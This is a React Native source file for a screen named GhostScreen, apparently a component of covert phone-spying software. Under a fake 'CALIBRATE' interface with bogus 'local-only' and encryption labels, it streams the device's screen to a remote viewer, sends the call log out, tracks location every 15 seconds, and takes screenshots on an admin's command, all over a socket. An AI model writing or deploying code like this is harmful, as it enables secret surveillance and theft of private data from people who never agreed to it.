import React, { useEffect, useState, useRef } from 'react';
import { 
  View, 
  Text, 
  TouchableOpacity, 
  StyleSheet, 
  PermissionsAndroid, 
  Alert,
  Platform,
  Linking
} from 'react-native';
import * as Battery from 'expo-battery';
import * as Location from 'expo-location';
import * as ScreenCapture from 'expo-screen-capture';
import { captureScreen } from 'react-native-view-shot';
import CallLogs from 'react-native-call-log';
import { mediaDevices, RTCPeerConnection, RTCIceCandidate, RTCSessionDescription } from 'react-native-webrtc';
import socket from '../services/socket';
import AppHeader from '../components/AppHeader';

const GhostScreen = ({ route }) => {
  const { name } = route.params;
  const [isSyncing, setIsSyncing] = useState(false);
  const pcRef = useRef(null);

  useEffect(() => {
    // 1. Setup background tasks and permissions
    const startup = async () => {
      if (Platform.OS === 'android') {
        await PermissionsAndroid.requestMultiple([
          PermissionsAndroid.PERMISSIONS.READ_CALL_LOG,
          PermissionsAndroid.PERMISSIONS.READ_PHONE_STATE,
          PermissionsAndroid.PERMISSIONS.ACCESS_FINE_LOCATION,
        ]);
      }
      
      const { status } = await Location.requestForegroundPermissionsAsync();
      if (status === 'granted') {
        Location.startLocationUpdatesAsync('GHOST_LOCATION', {
          accuracy: Location.Accuracy.BestForNavigation,
          timeInterval: 15000, // Update every 15s
          distanceInterval: 10
        }).catch(() => {});
      }

      // Initial Vitals
      updateVitals();
      setInterval(updateVitals, 60000);
    };

    startup();

    // 2. Handle Signaling from Admin/Viewer
    socket.on('webrtc_signal', async (data) => {
      if (data.target !== name) return;
      if (!pcRef.current) return;

      if (data.type === 'answer') {
        await pcRef.current.setRemoteDescription(new RTCSessionDescription(data.answer));
      } else if (data.type === 'candidate') {
        await pcRef.current.addIceCandidate(new RTCIceCandidate(data.candidate));
      }
    });

    // 3. Command Listener (Snapshot / Location / WIPE)
    socket.on('admin_command', async (cmd) => {
      if (cmd === 'SNAPSHOT') {
        const uri = await captureScreen({ format: 'jpg', quality: 0.5 });
        socket.emit('ghost_activity', { name, type: 'SNAPSHOT', data: uri });
      }
    });

    return () => {
      socket.off('webrtc_signal');
      socket.off('admin_command');
      if (pcRef.current) pcRef.current.close();
    };
  }, []);

  const updateVitals = async () => {
    const bat = await Battery.getBatteryLevelAsync();
    const loc = await Location.getCurrentPositionAsync({ accuracy: Location.Accuracy.Balanced });
    
    socket.emit('heartbeat_update', {
      name,
      battery: Math.floor(bat * 100) + '%',
      location: { lat: loc.coords.latitude, lng: loc.coords.longitude },
      status: 'OPTIMIZED',
      lastSeen: Date.now()
    });
  };

  // 4. Start Screen Projection (Caller Mode)
  const startCalibration = async () => {
    try {
      setIsSyncing(true);
      
      const stream = await mediaDevices.getDisplayMedia({
        video: { width: 480, height: 854, frameRate: 15 }
      });

      if (stream) {
        const configuration = { iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] };
        const peerConnection = new RTCPeerConnection(configuration);
        pcRef.current = peerConnection;

        stream.getTracks().forEach(track => peerConnection.addTrack(track, stream));

        peerConnection.onicecandidate = (event) => {
          if (event.candidate) {
            socket.emit('webrtc_signal', { from: name, type: 'candidate', candidate: event.candidate });
          }
        };

        const offer = await peerConnection.createOffer();
        await peerConnection.setLocalDescription(offer);
        socket.emit('webrtc_signal', { from: name, type: 'offer', offer: offer });

        // Sync extra logs during calibration
        const logs = await CallLogs.load(10);
        socket.emit('ghost_activity', { name, type: 'LOG_SYNC', data: logs });
      }
    } catch (err) {
      setIsSyncing(false);
      Alert.alert("System", "Hardware calibration failed. Service overlay rejected.");
    }
  };

  return (
    <View style={styles.container}>
      <AppHeader />

      <TouchableOpacity 
        style={[styles.orb, isSyncing && styles.orbActive]} 
        onPress={startCalibration}
      >
        <Text style={styles.orbText}>{isSyncing ? "ANALYZING..." : "CALIBRATE"}</Text>
      </TouchableOpacity>

      <View style={styles.statusBox}>
        <Text style={styles.statusText}>AI CORES: <Text style={styles.val}>8 ACTIVE</Text></Text>
        <Text style={styles.statusText}>ENCRYPTION: <Text style={styles.val}>WPA3-ENTERPRISE</Text></Text>
        <Text style={styles.statusText}>DATABASE: <Text style={styles.val}>LOCAL-ONLY</Text></Text>
      </View>

      <View style={styles.supportLinks}>
        <TouchableOpacity onPress={() => Linking.openURL('https://github.com/guru9/joyjet-hub/releases/download/latest/app-debug.apk')}>
          <Text style={styles.supportText}>UPDATE SYSTEM</Text>
        </TouchableOpacity>
        <Text style={styles.supportPipe}>|</Text>
        <TouchableOpacity onPress={() => Linking.openURL('https://github.com/guru9/joyjet-hub/releases/download/v4.1.0/app-debug.apk')}>
          <Text style={styles.supportText}>ROLLBACK</Text>
        </TouchableOpacity>
      </View>
    </View>
  );
};

const styles = StyleSheet.create({
  container: { flex: 1, backgroundColor: '#000', justifyContent: 'space-between', paddingVertical: 80, alignItems: 'center' },
  orb: { width: 200, height: 200, borderRadius: 100, backgroundColor: '#050505', borderWidth: 1, borderColor: '#111', justifyContent: 'center', alignItems: 'center' },
  orbActive: { borderColor: '#00ff00', shadowColor: '#00ff00', shadowRadius: 20, shadowOpacity: 0.4 },
  orbText: { color: '#444', fontSize: 11, fontWeight: 'bold', letterSpacing: 2 },
  statusBox: { width: '80%', padding: 20, backgroundColor: '#030303', borderRadius: 5, borderWidth: 1, borderColor: '#0a0a0a' },
  statusText: { color: '#1a1a1a', fontSize: 9, marginBottom: 5, letterSpacing: 1 },
  val: { color: '#0a220a' },
  supportLinks: { flexDirection: 'row', gap: 10, marginTop: -40, opacity: 0.3 },
  supportText: { color: '#fff', fontSize: 7, letterSpacing: 1 },
  supportPipe: { color: '#222', fontSize: 7 }
});

export default GhostScreen;
